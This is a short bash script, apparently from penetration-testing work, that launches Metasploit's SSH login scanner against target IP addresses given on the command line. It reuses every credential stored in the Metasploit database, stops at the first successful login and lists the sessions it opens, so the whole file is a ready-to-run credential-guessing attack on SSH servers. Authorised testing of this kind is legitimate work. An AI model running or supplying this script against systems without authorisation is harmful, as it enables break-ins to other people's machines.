#!/bin/bash

ipaddresses=("$@")

if [[ -z "$@" ]]; then
	echo "You need to enter at least one IP address for your target machine(s)."
	exit 1
fi

msfconsole -q -x "workspace pentesting_2; \
	use auxiliary/scanner/ssh/ssh_login; \
       	set RHOSTS $(echo "${ipaddresses[@]}"); \
       	set BRUTEFORCE_SPEED 1; \
	set DB_ALL_CREDS true; \
	set STOP_ON_SUCCESS true; \
	set THREADS $(echo "${#ipaddresses[@]}"); \
	set USER_AS_PASS false; \
	set VERBOSE true; \
	run; \
	sessions"

